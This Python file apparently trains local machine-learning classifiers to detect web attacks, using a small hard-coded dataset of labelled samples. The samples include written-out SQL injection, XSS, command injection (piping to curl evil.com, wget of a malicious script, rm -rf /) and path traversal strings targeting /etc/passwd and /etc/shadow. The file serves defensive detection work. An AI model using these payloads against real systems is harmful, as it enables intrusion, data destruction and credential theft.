"""
Local Security Classifier Trainer
Train custom models on security data for local deployment
"""
import os
import json
import pandas as pd
import numpy as np
from typing import Dict, List, Tuple, Any
from sklearn.model_selection import train_test_split
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.ensemble import RandomForestClassifier
from sklearn.linear_model import LogisticRegression
from sklearn.svm import SVC
from sklearn.metrics import classification_report, confusion_matrix, accuracy_score
import joblib
import re

class SecurityClassifierTrainer:
    """
    Train and evaluate security threat classifiers
    """
    
    def __init__(self):
        self.vectorizer = TfidfVectorizer(max_features=5000, stop_words='english')
        self.models = {}
        self.data_path = "data/security_data"
        
    def create_sample_dataset(self) -> pd.DataFrame:
        """Create sample security dataset for training"""
        
        # Expanded security data
        data = [
            # SQL Injection samples (more variations)
            {"text": "SELECT * FROM users WHERE id=1 OR 1=1", "label": "SQL_Injection", "threat_level": "HIGH"},
            {"text": "admin'--", "label": "SQL_Injection", "threat_level": "HIGH"},
            {"text": "UNION SELECT username, password FROM users", "label": "SQL_Injection", "threat_level": "HIGH"},
            {"text": "'; DROP TABLE users; --", "label": "SQL_Injection", "threat_level": "HIGH"},
            {"text": "1' OR '1'='1", "label": "SQL_Injection", "threat_level": "HIGH"},
            {"text": "SELECT password FROM admin WHERE username='admin'", "label": "SQL_Injection", "threat_level": "HIGH"},
            {"text": "INSERT INTO users VALUES ('hacker', 'pass')", "label": "SQL_Injection", "threat_level": "HIGH"},
            {"text": "UPDATE users SET password='hacked' WHERE id=1", "label": "SQL_Injection", "threat_level": "HIGH"},
            
            # XSS samples (more variations)
            {"text": "<script>alert('XSS')</script>", "label": "XSS", "threat_level": "HIGH"},
            {"text": "<img src=x onerror=alert(1)>", "label": "XSS", "threat_level": "HIGH"},
            {"text": "javascript:alert('XSS')", "label": "XSS", "threat_level": "HIGH"},
            {"text": "<iframe src='javascript:alert(1)'></iframe>", "label": "XSS", "threat_level": "HIGH"},
            {"text": "<body onload=alert('XSS')>", "label": "XSS", "threat_level": "HIGH"},
            {"text": "<svg onload=alert('XSS')>", "label": "XSS", "threat_level": "HIGH"},
            {"text": "document.cookie", "label": "XSS", "threat_level": "HIGH"},
            {"text": "eval('alert(1)')", "label": "XSS", "threat_level": "HIGH"},
            
            # Command Injection samples (more variations)
            {"text": "; ls -la", "label": "Command_Injection", "threat_level": "HIGH"},
            {"text": "| cat /etc/passwd", "label": "Command_Injection", "threat_level": "HIGH"},
            {"text": "&& rm -rf /", "label": "Command_Injection", "threat_level": "HIGH"},
            {"text": "`whoami`", "label": "Command_Injection", "threat_level": "HIGH"},
            {"text": "; wget malicious.sh", "label": "Command_Injection", "threat_level": "HIGH"},
            {"text": "| curl evil.com", "label": "Command_Injection", "threat_level": "HIGH"},
            {"text": "&& chmod +x malware", "label": "Command_Injection", "threat_level": "HIGH"},
            {"text": "; python -c 'import os; os.system(\"ls\")'", "label": "Command_Injection", "threat_level": "HIGH"},
            
            # Path Traversal samples (more variations)
            {"text": "../../../etc/passwd", "label": "Path_Traversal", "threat_level": "HIGH"},
            {"text": "..\\..\\windows\\system32", "label": "Path_Traversal", "threat_level": "HIGH"},
            {"text": "/var/www/../../", "label": "Path_Traversal", "threat_level": "HIGH"},
            {"text": "....//....//....//etc/passwd", "label": "Path_Traversal", "threat_level": "HIGH"},
            {"text": "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "label": "Path_Traversal", "threat_level": "HIGH"},
            {"text": "/proc/self/environ", "label": "Path_Traversal", "threat_level": "HIGH"},
            {"text": "/etc/shadow", "label": "Path_Traversal", "threat_level": "HIGH"},
            {"text": "C:\\Windows\\System32\\config\\sam", "label": "Path_Traversal", "threat_level": "HIGH"},
            
            # Bot/Scanner samples (more variations)
            {"text": "sqlmap/1.0 automatic scanner", "label": "Bot_Activity", "threat_level": "MEDIUM"},
            {"text": "nikto/2.1 vulnerability scanner", "label": "Bot_Activity", "threat_level": "MEDIUM"},
            {"text": "nmap scanning tool", "label": "Bot_Activity", "threat_level": "MEDIUM"},
            {"text": "python-requests/2.25.1", "label": "Bot_Activity", "threat_level": "LOW"},
            {"text": "curl/7.68.0", "label": "Bot_Activity", "threat_level": "LOW"},
            {"text": "wget/1.20.3", "label": "Bot_Activity", "threat_level": "LOW"},
            {"text": "gobuster/3.0.1", "label": "Bot_Activity", "threat_level": "MEDIUM"},
            {"text": "dirb/2.22", "label": "Bot_Activity", "threat_level": "MEDIUM"},
            
            # Brute Force samples (more variations)
            {"text": "POST /login: admin:admin123 (attempt 1/100)", "label": "Brute_Force", "threat_level": "MEDIUM"},
            {"text": "POST /login: root:password (attempt 50/100)", "label": "Brute_Force", "threat_level": "MEDIUM"},
            {"text": "Multiple failed login attempts from same IP", "label": "Brute_Force", "threat_level": "MEDIUM"},
            {"text": "POST /admin: administrator:123456", "label": "Brute_Force", "threat_level": "MEDIUM"},
            {"text": "SSH brute force: root:root", "label": "Brute_Force", "threat_level": "MEDIUM"},
            {"text": "FTP brute force: admin:admin", "label": "Brute_Force", "threat_level": "MEDIUM"},
            {"text": "RDP brute force: user:password", "label": "Brute_Force", "threat_level": "MEDIUM"},
            {"text": "Dictionary attack on login", "label": "Brute_Force", "threat_level": "MEDIUM"},
            
            # DDoS samples (more variations)
            {"text": "GET /?id=1&size=999999999", "label": "DDoS_Attack", "threat_level": "HIGH"},
            {"text": "POST /upload: huge_file_payload", "label": "DDoS_Attack", "threat_level": "HIGH"},
            {"text": "Rate limit exceeded: 1000 req/min", "label": "DDoS_Attack", "threat_level": "HIGH"},
            {"text": "SYN flood attack detected", "label": "DDoS_Attack", "threat_level": "HIGH"},
            {"text": "UDP flood from multiple IPs", "label": "DDoS_Attack", "threat_level": "HIGH"},
            {"text": "HTTP GET flood attack", "label": "DDoS_Attack", "threat_level": "HIGH"},
            {"text": "Slowloris attack pattern", "label": "DDoS_Attack", "threat_level": "HIGH"},
            {"text": "Amplification attack detected", "label": "DDoS_Attack", "threat_level": "HIGH"},
            
            # Normal samples (more variations)
            {"text": "GET /home: normal browsing", "label": "Normal", "threat_level": "LOW"},
            {"text": "POST /contact: contact form submission", "label": "Normal", "threat_level": "LOW"},
            {"text": "User-Agent: Mozilla/5.0 normal browser", "label": "Normal", "threat_level": "LOW"},
            {"text": "GET /api/data: legitimate API call", "label": "Normal", "threat_level": "LOW"},
            {"text": "POST /login: username=user&password=pass", "label": "Normal", "threat_level": "LOW"},
            {"text": "GET /products: shopping page", "label": "Normal", "threat_level": "LOW"},
            {"text": "POST /search: search query", "label": "Normal", "threat_level": "LOW"},
            {"text": "GET /dashboard: user dashboard", "label": "Normal", "threat_level": "LOW"},
            {"text": "Chrome/90.0.4430.212 Safari/537.36", "label": "Normal", "threat_level": "LOW"},
            {"text": "Firefox/88.0 Gecko/20100101 Firefox/88.0", "label": "Normal", "threat_level": "LOW"},
        ]
        
        return pd.DataFrame(data)
    
    def extract_features(self, text: str) -> np.ndarray:
        """Extract security-related features from text"""
        features = []
        
        # Length-based features
        features.append(len(text))
        features.append(len(text.split()))
        
        # Special character counts
        features.append(text.count('<'))
        features.append(text.count('>'))
        features.append(text.count('"'))
        features.append(text.count("'"))
        features.append(text.count(';'))
        features.append(text.count('--'))
        features.append(text.count('/*'))
        features.append(text.count('*/'))
        features.append(text.count('../'))
        features.append(text.count('..\\'))
        
        # SQL patterns
        sql_keywords = ['select', 'union', 'drop', 'insert', 'update', 'delete', 'exec', 'script']
        features.append(sum(1 for keyword in sql_keywords if keyword.lower() in text.lower()))
        
        # XSS patterns
        xss_keywords = ['script', 'javascript', 'onerror', 'onload', 'iframe', 'alert']
        features.append(sum(1 for keyword in xss_keywords if keyword.lower() in text.lower()))
        
        # Command patterns
        cmd_keywords = ['ls', 'cat', 'rm', 'whoami', 'ps', 'kill']
        features.append(sum(1 for keyword in cmd_keywords if keyword.lower() in text.lower()))
        
        # URL patterns
        url_keywords = ['http', 'https', 'www', '.com', '.org']
        features.append(sum(1 for keyword in url_keywords if keyword.lower() in text.lower()))
        
        return np.array(features)
    
    def train_models(self, df: pd.DataFrame) -> Dict[str, Any]:
        """Train multiple classification models"""
        
        # Prepare features and labels
        X_text = df['text'].values
        y = df['label'].values
        
        # Vectorize text
        X = self.vectorizer.fit_transform(X_text)
        
        # Split data (no stratification for small dataset)
        X_train, X_test, y_train, y_test = train_test_split(
            X, y, test_size=0.2, random_state=42
        )
        
        # Train multiple models
        models = {
            'random_forest': RandomForestClassifier(n_estimators=100, random_state=42),
            'logistic_regression': LogisticRegression(random_state=42, max_iter=1000),
            'svm': SVC(random_state=42, probability=True)
        }
        
        results = {}
        
        for name, model in models.items():
            print(f"Training {name}...")
            model.fit(X_train, y_train)
            
            # Evaluate
            y_pred = model.predict(X_test)
            accuracy = accuracy_score(y_test, y_pred)
            
            results[name] = {
                'model': model,
                'accuracy': accuracy,
                'predictions': y_pred,
                'test_labels': y_test
            }
            
            print(f"{name} accuracy: {accuracy:.3f}")
        
        self.models = results
        return results
    
    def evaluate_models(self) -> Dict[str, Any]:
        """Detailed evaluation of trained models"""
        if not self.models:
            return {"error": "No models trained"}
        
        evaluation = {}
        
        for name, result in self.models.items():
            model = result['model']
            y_test = result['test_labels']
            y_pred = result['predictions']
            
            # Classification report
            report = classification_report(y_test, y_pred, output_dict=True)
            
            # Confusion matrix
            cm = confusion_matrix(y_test, y_pred)
            
            evaluation[name] = {
                'accuracy': result['accuracy'],
                'classification_report': report,
                'confusion_matrix': cm.tolist(),
                'model_type': type(model).__name__
            }
        
        return evaluation
    
    def save_models(self, save_path: str = "models") -> None:
        """Save trained models to disk"""
        os.makedirs(save_path, exist_ok=True)
        
        for name, result in self.models.items():
            model_path = os.path.join(save_path, f"security_classifier_{name}.pkl")
            joblib.dump(result['model'], model_path)
            
            # Save vectorizer
            vectorizer_path = os.path.join(save_path, "tfidf_vectorizer.pkl")
            joblib.dump(self.vectorizer, vectorizer_path)
            
            print(f"Saved {name} model to {model_path}")
        
        # Save metadata
        metadata = {
            'model_types': list(self.models.keys()),
            'vectorizer_type': 'TfidfVectorizer',
            'max_features': 5000,
            'training_date': pd.Timestamp.now().isoformat()
        }
        
        metadata_path = os.path.join(save_path, "model_metadata.json")
        with open(metadata_path, 'w') as f:
            json.dump(metadata, f, indent=2)
    
    def load_models(self, load_path: str = "models") -> bool:
        """Load pre-trained models from disk"""
        try:
            # Load vectorizer
            vectorizer_path = os.path.join(load_path, "tfidf_vectorizer.pkl")
            if os.path.exists(vectorizer_path):
                self.vectorizer = joblib.load(vectorizer_path)
            
            # Load models
            loaded_models = {}
            for name in ['random_forest', 'logistic_regression', 'svm']:
                model_path = os.path.join(load_path, f"security_classifier_{name}.pkl")
                if os.path.exists(model_path):
                    loaded_models[name] = joblib.load(model_path)
                    print(f"Loaded {name} model from {model_path}")
            
            self.models = {name: {'model': model} for name, model in loaded_models.items()}
            return len(loaded_models) > 0
            
        except Exception as e:
            print(f"Failed to load models: {e}")
            return False
    
    def predict(self, text: str, model_name: str = 'random_forest') -> Dict[str, Any]:
        """Make prediction using specified model"""
        if model_name not in self.models:
            return {"error": f"Model {model_name} not available"}
        
        model = self.models[model_name]['model']
        
        # Vectorize input
        X = self.vectorizer.transform([text])
        
        # Predict
        prediction = model.predict(X)[0]
        probabilities = model.predict_proba(X)[0] if hasattr(model, 'predict_proba') else [1.0, 0.0]
        
        # Get confidence
        confidence = max(probabilities)
        
        # Determine threat level
        threat_levels = {
            'Normal': 'LOW',
            'Bot_Activity': 'MEDIUM',
            'Brute_Force': 'MEDIUM',
            'SQL_Injection': 'HIGH',
            'XSS': 'HIGH',
            'Command_Injection': 'HIGH',
            'Path_Traversal': 'HIGH',
            'DDoS_Attack': 'CRITICAL'
        }
        
        threat_level = threat_levels.get(prediction, 'LOW')
        
        return {
            'classification': prediction,
            'confidence': float(confidence),
            'threat_level': threat_level,
            'model_used': model_name,
            'probabilities': dict(zip(model.classes_, probabilities))
        }

def main():
    """Main training pipeline"""
    trainer = SecurityClassifierTrainer()
    
    # Create dataset
    print("Creating sample dataset...")
    df = trainer.create_sample_dataset()
    
    # Train models
    print("Training models...")
    results = trainer.train_models(df)
    
    # Evaluate
    print("Evaluating models...")
    evaluation = trainer.evaluate_models()
    
    # Save models
    print("Saving models...")
    trainer.save_models()
    
    print("Training complete!")
    return evaluation

if __name__ == "__main__":
    evaluation = main()
    
    # Print summary
    print("\n=== TRAINING SUMMARY ===")
    for name, eval_result in evaluation.items():
        print(f"\n{name.upper()}:")
        print(f"  Accuracy: {eval_result['accuracy']:.3f}")
        print(f"  Model Type: {eval_result['model_type']}")
